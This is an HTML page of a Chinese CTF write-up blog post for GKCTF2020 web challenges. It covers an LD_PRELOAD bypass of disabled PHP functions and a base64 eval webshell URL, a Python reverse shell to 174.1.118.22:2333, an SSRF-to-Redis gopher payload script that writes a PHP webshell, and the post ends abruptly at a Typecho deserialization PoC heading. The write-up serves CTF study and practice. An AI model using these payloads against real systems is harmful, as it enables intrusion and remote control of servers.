@@ -1,0 +1,1038 @@
+<!DOCTYPE html>
+
+
+
+
+
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 3.9.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.4.0">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.4.0">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.4.0">
+  <link rel="mask-icon" href="/images/logo.svg?v=7.4.0" color="#222">
+  <link rel="alternate" href="/atom.xml" title="0xCreed" type="application/atom+xml">
+  <meta http-equiv="Cache-Control" content="no-transform">
+  <meta http-equiv="Cache-Control" content="no-siteapp">
+  <meta name="google-site-verification" content="rVyfNQnulCtgdXjqVYGrMUrs740-YJfu_KMgtp6etq0">
+
+<link rel="stylesheet" href="/css/main.css?v=7.4.0">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-loading-bar.min.css?v=1.0.2">
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '7.4.0',
+    exturl: false,
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    copycode: {"enable":true,"show_result":true,"style":"default"},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
+    bookmark: {"enable":false,"color":"#222","save":"auto"},
+    fancybox: false,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      appID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    path: 'search.xml',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: '复制',
+      copy_success: '复制成功',
+      copy_failure: '复制失败'
+    },
+    sidebarPadding: 40
+  };
+</script>
+
+  <meta name="description" content="WEB1.Check IN进去就是一个马执行phpinfo后发现，禁用了执行命令的系统函数，但putenv未被禁用，所以想到劫持动态库执行命令。先用蚁剑连接构造如下URL，http://384607b7-c341-452f-b732-101819a34a69.node3.buuoj.cn/?Ginkgo=QGV2YWwoJF9QT1NUWydhJ10pOw==密码是a">
+<meta name="keywords" content="CTF,WP">
+<meta property="og:type" content="article">
+<meta property="og:title" content="GKCTF2020-WP">
+<meta property="og:url" content="https://0xcreed.jxustctf.top/2020/05/GKCTF2020-Writeup/index.html">
+<meta property="og:site_name" content="0xCreed">
+<meta property="og:description" content="WEB1.Check IN进去就是一个马执行phpinfo后发现，禁用了执行命令的系统函数，但putenv未被禁用，所以想到劫持动态库执行命令。先用蚁剑连接构造如下URL，http://384607b7-c341-452f-b732-101819a34a69.node3.buuoj.cn/?Ginkgo=QGV2YWwoJF9QT1NUWydhJ10pOw==密码是a">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://0xcreed.jxustctf.top/2020/05/GKCTF2020-Writeup/image-20200524132441686.png">
+<meta property="og:image" content="https://0xcreed.jxustctf.top/2020/05/GKCTF2020-Writeup/image-20200524133145293.png">
+<meta property="og:image" content="https://0xcreed.jxustctf.top/2020/05/GKCTF2020-Writeup/image-20200524145719302.png">
+<meta property="og:image" content="https://0xcreed.jxustctf.top/2020/05/GKCTF2020-Writeup/image-20200524145846453.png">
+<meta property="og:image" content="https://0xcreed.jxustctf.top/2020/05/GKCTF2020-Writeup/image-20200524145602985.png">
+<meta property="og:image" content="https://0xcreed.jxustctf.top/2020/05/GKCTF2020-Writeup/20232423444217.png">
+<meta property="og:image" content="https://0xcreed.jxustctf.top/2020/05/GKCTF2020-Writeup/image-20200524145546293.png">
+<meta property="og:image" content="https://0xcreed.jxustctf.top/2020/05/GKCTF2020-Writeup/image-20200525105018707.png">
+<meta property="og:image" content="https://0xcreed.jxustctf.top/2020/05/GKCTF2020-Writeup/image-20200525105045473.png">
+<meta property="og:image" content="https://0xcreed.jxustctf.top/2020/05/GKCTF2020-Writeup/image-20200525105141216.png">
+<meta property="og:image" content="https://0xcreed.jxustctf.top/2020/05/GKCTF2020-Writeup/image-20200525105212253.png">
+<meta property="og:image" content="https://0xcreed.jxustctf.top/2020/05/GKCTF2020-Writeup/image-20200525110646995.png">
+<meta property="og:image" content="https://0xcreed.jxustctf.top/2020/05/GKCTF2020-Writeup/image-20200525110728289.png">
+<meta property="og:image" content="https://0xcreed.jxustctf.top/2020/05/GKCTF2020-Writeup/image-20200525111239096.png">
+<meta property="og:image" content="https://0xcreed.jxustctf.top/2020/05/GKCTF2020-Writeup/image-20200525111352798.png">
+<meta property="og:image" content="https://0xcreed.jxustctf.top/2020/05/GKCTF2020-Writeup/image-20200525112129001.png">
+<meta property="og:image" content="https://0xcreed.jxustctf.top/2020/05/GKCTF2020-Writeup/image-20200525112303602.png">
+<meta property="og:image" content="https://0xcreed.jxustctf.top/2020/05/GKCTF2020-Writeup/image-20200525130359211.png">
+<meta property="og:image" content="https://0xcreed.jxustctf.top/2020/05/GKCTF2020-Writeup/image-20200525130438217.png">
+<meta property="og:image" content="https://0xcreed.jxustctf.top/2020/05/GKCTF2020-Writeup/image-20200525131721234.png">
+<meta property="og:image" content="https://0xcreed.jxustctf.top/2020/05/GKCTF2020-Writeup/image-20200525135740889.png">
+<meta property="og:image" content="https://0xcreed.jxustctf.top/2020/05/GKCTF2020-Writeup/image-20200525140208760.png">
+<meta property="og:image" content="https://0xcreed.jxustctf.top/2020/05/GKCTF2020-Writeup/image-20200525140624669.png">
+<meta property="og:image" content="https://0xcreed.jxustctf.top/2020/05/GKCTF2020-Writeup/image-20200525151514661.png">
+<meta property="og:image" content="https://0xcreed.jxustctf.top/2020/05/GKCTF2020-Writeup/image-20200526105114519.png">
+<meta property="og:image" content="https://0xcreed.jxustctf.top/2020/05/GKCTF2020-Writeup/image-20200526105632498.png">
+<meta property="og:image" content="https://0xcreed.jxustctf.top/2020/05/GKCTF2020-Writeup/image-20200526105730727.png">
+<meta property="og:image" content="https://0xcreed.jxustctf.top/2020/05/GKCTF2020-Writeup/image-20200526113701783.png">
+<meta property="og:image" content="https://0xcreed.jxustctf.top/2020/05/GKCTF2020-Writeup/clip_image001.png">
+<meta property="og:image" content="https://0xcreed.jxustctf.top/2020/05/GKCTF2020-Writeup/image-20200526155704949.png">
+<meta property="og:image" content="https://0xcreed.jxustctf.top/2020/05/GKCTF2020-Writeup/image-20200526161615952.png">
+<meta property="og:image" content="https://0xcreed.jxustctf.top/2020/05/GKCTF2020-Writeup/image-20200526161626648.png">
+<meta property="og:image" content="https://0xcreed.jxustctf.top/2020/05/GKCTF2020-Writeup/image-20200526161717329.png">
+<meta property="og:image" content="https://0xcreed.jxustctf.top/2020/05/GKCTF2020-Writeup/image-20200526163147548.png">
+<meta property="og:image" content="https://0xcreed.jxustctf.top/2020/05/GKCTF2020-Writeup/image-20200526165220148.png">
+<meta property="og:image" content="https://0xcreed.jxustctf.top/2020/05/GKCTF2020-Writeup/image-20200526165724934.png">
+<meta property="og:image" content="https://0xcreed.jxustctf.top/2020/05/GKCTF2020-Writeup/image-20200526170554507.png">
+<meta property="og:image" content="https://0xcreed.jxustctf.top/2020/05/GKCTF2020-Writeup/image-20200526170728445.png">
+<meta property="og:image" content="https://0xcreed.jxustctf.top/2020/05/GKCTF2020-Writeup/image-20200526172054944.png">
+<meta property="og:updated_time" content="2020-05-26T09:27:24.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="GKCTF2020-WP">
+<meta name="twitter:description" content="WEB1.Check IN进去就是一个马执行phpinfo后发现，禁用了执行命令的系统函数，但putenv未被禁用，所以想到劫持动态库执行命令。先用蚁剑连接构造如下URL，http://384607b7-c341-452f-b732-101819a34a69.node3.buuoj.cn/?Ginkgo=QGV2YWwoJF9QT1NUWydhJ10pOw==密码是a">
+<meta name="twitter:image" content="https://0xcreed.jxustctf.top/2020/05/GKCTF2020-Writeup/image-20200524132441686.png">
+  <link rel="canonical" href="https://0xcreed.jxustctf.top/2020/05/GKCTF2020-Writeup/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true,
+    isPage: false,
+    isArchive: false
+  };
+</script>
+
+  <title>GKCTF2020-WP | 0xCreed</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+  <div class="container use-motion">
+    <div class="headband"></div>
+	<a href="https://github.com/0xcreed" class="github-corner" aria-label="View source on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#151513; color:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">0xCreed</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+      
+      
+      
+        
+        <li class="menu-item menu-item-home">
+      
+    
+      
+      
+        
+      
+        
+      
+        
+      
+    
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-about">
+      
+    
+      
+      
+        
+      
+        
+      
+        
+      
+    
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>关于</a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-tags">
+      
+    
+      
+      
+        
+      
+        
+      
+        
+          
+        
+      
+    
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签<span class="badge">35</span></a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-categories">
+      
+    
+      
+      
+        
+      
+        
+          
+        
+      
+        
+      
+    
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类<span class="badge">4</span></a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-archives">
+      
+    
+      
+      
+        
+          
+        
+      
+        
+      
+        
+      
+    
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档<span class="badge">31</span></a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-commonweal">
+      
+    
+      
+      
+        
+      
+        
+      
+        
+      
+    
+
+    <a href="/404/" rel="section"><i class="fa fa-fw fa-heartbeat"></i>公益 404</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a href="javascript:;" class="popup-trigger">
+        
+          <i class="fa fa-search fa-fw"></i>搜索</a>
+      </li>
+    
+  </ul>
+
+</nav>
+  <div class="site-search">
+    <div class="popup search-popup">
+    <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocorrect="off" autocapitalize="none"
+           placeholder="搜索..." spellcheck="false"
+           type="text" id="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result"></div>
+
+</div>
+<div class="search-pop-overlay"></div>
+
+  </div>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+            
+
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+      <article itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block post">
+    <link itemprop="mainEntityOfPage" href="https://0xcreed.jxustctf.top/2020/05/GKCTF2020-Writeup/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="0xCreed">
+      <meta itemprop="description" content="Winter is coming">
+      <meta itemprop="image" content="/images/1.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="0xCreed">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">GKCTF2020-WP
+
+          
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              
+                
+              
+
+              <time title="创建时间：2020-05-24 13:00:18" itemprop="dateCreated datePublished" datetime="2020-05-24T13:00:18+08:00">2020-05-24</time>
+            </span>
+          
+            
+
+            
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-05-26 17:27:24" itemprop="dateModified" datetime="2020-05-26T17:27:24+08:00">2020-05-26</time>
+              </span>
+            
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+          
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="fa fa-comment-o"></i>
+      </span>
+        
+      
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/2020/05/GKCTF2020-Writeup/#comments" itemprop="discussionUrl"><span class="post-comments-count valine-comment-count" data-xid="/2020/05/GKCTF2020-Writeup/" itemprop="commentCount"></span></a>
+  </span>
+  
+  
+          
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">本文字数：</span>
+              
+              <span>6.2k</span>
+            </span>
+          
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              
+              <span>6 分钟</span>
+            </span>
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="1-Check-IN"><a href="#1-Check-IN" class="headerlink" title="1.Check IN"></a>1.Check IN</h3><p><img src="/2020/05/GKCTF2020-Writeup/image-20200524132441686.png" alt="image-20200524132441686"></p><p>进去就是一个马</p><p>执行phpinfo后发现，禁用了执行命令的系统函数，但putenv未被禁用，所以想到劫持动态库执行命令。</p><p>先用蚁剑连接</p><p>构造如下URL，<a href="http://384607b7-c341-452f-b732-101819a34a69.node3.buuoj.cn/?Ginkgo=QGV2YWwoJF9QT1NUWydhJ10pOw==密码是a" target="_blank" rel="noopener">http://384607b7-c341-452f-b732-101819a34a69.node3.buuoj.cn/?Ginkgo=QGV2YWwoJF9QT1NUWydhJ10pOw==密码是a</a></p><a id="more"></a>
+
+
+
+
+<p>或者修改编码器</p>
+<p><img src="/2020/05/GKCTF2020-Writeup/image-20200524133145293.png" alt="image-20200524133145293"></p>
+<p>上传恶意<a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD" target="_blank" rel="noopener">so文件和bypass.php</a>接着读flag</p>
+<p><code>http://384607b7-c341-452f-b732-101819a34a69.node3.buuoj.cn/?Ginkgo=QGV2YWwoJF9HRVRbJ2EnXSk7Cg==&amp;a=include(%27/var/tmp/1.php%27);&amp;cmd=./../../../readflag&amp;outpath=/tmp/123.txt&amp;sopath=/var/tmp/1.so</code></p>
+<h3 id="2-老八小超市儿"><a href="#2-老八小超市儿" class="headerlink" title="2.老八小超市儿"></a>2.老八小超市儿</h3><p>用的是shopxo模板，这里有个后台Getshell的漏洞。具体看这篇<a href="http://www.nctry.com/1660.html" target="_blank" rel="noopener">文章</a></p>
+<p>拿到shell用蚁剑连</p>
+<p><a href="http://20e6504f-9a68-4272-b02b-4de366165b48.node3.buuoj.cn/public/static/index/default/1.php" target="_blank" rel="noopener">http://20e6504f-9a68-4272-b02b-4de366165b48.node3.buuoj.cn/public/static/index/default/1.php</a></p>
+<p>然后发现根目录下有flag</p>
+<p>告诉我们flag在根目录</p>
+<p><img src="/2020/05/GKCTF2020-Writeup/image-20200524145719302.png" alt="image-20200524145719302"></p>
+<p>flag.hint有点奇怪</p>
+<p><img src="/2020/05/GKCTF2020-Writeup/image-20200524145846453.png" alt="image-20200524145846453"></p>
+<p>直到看到auto.sh，原来是个定时任务</p>
+<p><img src="/2020/05/GKCTF2020-Writeup/image-20200524145602985.png" alt="image-20200524145602985"></p>
+<p>接着修改makeflaghint.py遍历/root/</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">path_list = []</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_all</span><span class="params">(path)</span>:</span></span><br><span class="line">    paths = os.listdir(path)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> paths:</span><br><span class="line">        com_path = os.path.join(path,i)</span><br><span class="line">        <span class="keyword">if</span> os.path.isdir(com_path):</span><br><span class="line">            get_all(com_path)</span><br><span class="line">        <span class="keyword">elif</span> os.path.isfile(com_path):</span><br><span class="line">            path_list.append(com_path)</span><br><span class="line">        <span class="keyword">with</span>  open(<span class="string">'/flag.hint'</span>,<span class="string">'a'</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(com_path+<span class="string">'\n'</span>)</span><br><span class="line">        print(com_path) </span><br><span class="line">get_all(path=<span class="string">r'/root'</span>)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/05/GKCTF2020-Writeup/20232423444217.png" alt="20232423444217"></p>
+<p>发现flag接着读取就行</p>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">f1=<span class="built_in">open</span>(<span class="string">"/root/flag"</span>)</span><br><span class="line">aaa=f1.<span class="built_in">read</span>()</span><br><span class="line">f1.<span class="built_in">close</span>()</span><br><span class="line"><span class="keyword">with</span>  <span class="built_in">open</span>(<span class="string">'/flag.hint'</span>,<span class="string">'a'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.<span class="built_in">write</span>(aaa+<span class="string">'\n'</span>)</span><br><span class="line">print(<span class="string">"D"</span>)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/05/GKCTF2020-Writeup/image-20200524145546293.png" alt="image-20200524145546293"></p>
+<p>后面看官方WP是反弹shell</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket,subprocess,os</span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">s.connect((<span class="string">"174.1.118.22"</span>,<span class="number">2333</span>))</span><br><span class="line">os.dup2(s.fileno(),<span class="number">0</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">1</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">2</span>)</span><br><span class="line">p=subprocess.call([<span class="string">"/bin/sh"</span>,<span class="string">"-i"</span>])</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-CVE版签到"><a href="#3-CVE版签到" class="headerlink" title="3.CVE版签到"></a>3.CVE版签到</h3><p>开始没看懂这题在干啥，后面提示<a href="https://bugs.php.net/bug.php?id=79329" target="_blank" rel="noopener">CVE-2020-7066</a> gethead函数存在%00截断</p>
+<p>就试了文章里的Payload发现啥也没有。直到看了WP才发现原来都是Burp的锅</p>
+<p><img src="/2020/05/GKCTF2020-Writeup/image-20200525105018707.png" alt="image-20200525105018707"></p>
+<p><img src="/2020/05/GKCTF2020-Writeup/image-20200525105045473.png" alt="image-20200525105045473"></p>
+<p><img src="/2020/05/GKCTF2020-Writeup/image-20200525105141216.png" alt="image-20200525105141216"></p>
+<p><img src="/2020/05/GKCTF2020-Writeup/image-20200525105212253.png" alt="image-20200525105212253"></p>
+<p>这题确实签到(放了提示)，感觉主要考对最新一些的CVE的了解。偏实战，爱了爱了。</p>
+<h3 id="4-EZ三剑客-EzWeb"><a href="#4-EZ三剑客-EzWeb" class="headerlink" title="4.EZ三剑客-EzWeb"></a>4.EZ三剑客-EzWeb</h3><p>这题SSRF+redis未授权，但是shell死活收不到。后面看WP发现是独立于单容器的内网，内网靶机收不到反弹shell。所以是直接写webshell。</p>
+<p>开局就叫你输入URL，八成是个SSRF，就随意输入了127.0.0.1，发现被禁了。然后就想着怎么绕(后面发现不用。。。)</p>
+<p><img src="/2020/05/GKCTF2020-Writeup/image-20200525110646995.png" alt="image-20200525110646995"></p>
+<p><img src="/2020/05/GKCTF2020-Writeup/image-20200525110728289.png" alt="image-20200525110728289"></p>
+<p>发现<code>0x7f000001</code> 可以绕过。后面用Burp抓包，想扫描下本机端口，看到才看到secret这个参数</p>
+<p><img src="/2020/05/GKCTF2020-Writeup/image-20200525111239096.png" alt="image-20200525111239096"></p>
+<p>得到了本机的内网IP</p>
+<p><img src="/2020/05/GKCTF2020-Writeup/image-20200525111352798.png" alt="image-20200525111352798"></p>
+<p>这样一看肯定就不是本机的端口渗透，应该在内网的其他机器上，然后内网探测，很明显的提示了</p>
+<p><img src="/2020/05/GKCTF2020-Writeup/image-20200525112129001.png" alt="image-20200525112129001"></p>
+<p>然后就随意测了下6379端口，发现有戏</p>
+<p><img src="/2020/05/GKCTF2020-Writeup/image-20200525112303602.png" alt="image-20200525112303602"></p>
+<p>直接用脚本生成payload</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/python3<span class="number">.8</span></span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line">protocol=<span class="string">"gopher://"</span></span><br><span class="line">ip=<span class="string">"173.31.59.11"</span></span><br><span class="line">port=<span class="string">"6379"</span></span><br><span class="line">shell=<span class="string">"\n\n&lt;?php eval($_GET['a']);?&gt;\n\n"</span></span><br><span class="line">filename=<span class="string">"1.php"</span></span><br><span class="line">path=<span class="string">"/var/www/html"</span></span><br><span class="line">passwd=<span class="string">""</span></span><br><span class="line">cmd=[<span class="string">"flushall"</span>,</span><br><span class="line">     <span class="string">"set 1 &#123;&#125;"</span>.format(shell.replace(<span class="string">" "</span>,<span class="string">"$&#123;IFS&#125;"</span>)),</span><br><span class="line">     <span class="string">"config set dir &#123;&#125;"</span>.format(path),</span><br><span class="line">     <span class="string">"config set dbfilename &#123;&#125;"</span>.format(filename),</span><br><span class="line">     <span class="string">"save"</span></span><br><span class="line">     ]</span><br><span class="line"><span class="keyword">if</span> passwd:</span><br><span class="line">    cmd.insert(<span class="number">0</span>,<span class="string">"AUTH &#123;&#125;"</span>.format(passwd))</span><br><span class="line">payload=protocol+ip+<span class="string">":"</span>+port+<span class="string">"/_"</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">redis_format</span><span class="params">(arr)</span>:</span></span><br><span class="line">    CRLF=<span class="string">"\r\n"</span></span><br><span class="line">    redis_arr = arr.split(<span class="string">" "</span>)</span><br><span class="line">    cmd=<span class="string">""</span></span><br><span class="line">    cmd+=<span class="string">"*"</span>+str(len(redis_arr))</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> redis_arr:</span><br><span class="line">        cmd+=CRLF+<span class="string">"$"</span>+str(len((x.replace(<span class="string">"$&#123;IFS&#125;"</span>,<span class="string">" "</span>))))+CRLF+x.replace(<span class="string">"$&#123;IFS&#125;"</span>,<span class="string">" "</span>)</span><br><span class="line">    cmd+=CRLF</span><br><span class="line">    <span class="keyword">return</span> cmd</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> cmd:</span><br><span class="line">        payload += urllib.request.quote(redis_format(x))</span><br><span class="line">    print(payload)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/05/GKCTF2020-Writeup/image-20200525130359211.png" alt="image-20200525130359211"></p>
+<p>接着测试webshell</p>
+<p><img src="/2020/05/GKCTF2020-Writeup/image-20200525130438217.png" alt="image-20200525130438217"></p>
+<p><img src="/2020/05/GKCTF2020-Writeup/image-20200525131721234.png" alt="image-20200525131721234"></p>
+<h3 id="5-EZ三剑客-EzTypecho"><a href="#5-EZ三剑客-EzTypecho" class="headerlink" title="5.EZ三剑客-EzTypecho"></a>5.EZ三剑客-EzTypecho</h3><p>拿到题目源码后发现是0.9版本，先去github下了个0.9版本，然后用对比工具比较install.php</p>
+<p>发现<code>session_start();</code>被注释</p>
+<p><img src="/2020/05/GKCTF2020-Writeup/image-20200525135740889.png" alt="image-20200525135740889"></p>
+<p>关键代码</p>
+<p><img src="/2020/05/GKCTF2020-Writeup/image-20200525140208760.png" alt="image-20200525140208760"></p>
+<p>首先要反序列化就要SESSION，但<code>session_start();</code>被注释，可以通过以下方法绕过</p>
+<p><img src="/2020/05/GKCTF2020-Writeup/image-20200525140624669.png" alt="image-20200525140624669"></p>
+<p><a href="https://www.freebuf.com/vuls/155753.html" target="_blank" rel="noopener">Typecho反序列化的文章</a></p>
+<p>poc.php</p>
